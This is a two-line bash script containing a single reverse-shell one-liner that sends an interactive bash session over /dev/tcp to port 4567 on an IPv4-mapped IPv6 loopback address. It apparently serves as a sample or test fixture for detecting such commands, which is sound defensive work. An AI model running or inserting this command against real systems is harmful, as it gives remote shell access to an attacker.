#!/bin/bash
bash -i >& /dev/tcp/::ffff:127.0.0.1/4567 0>&1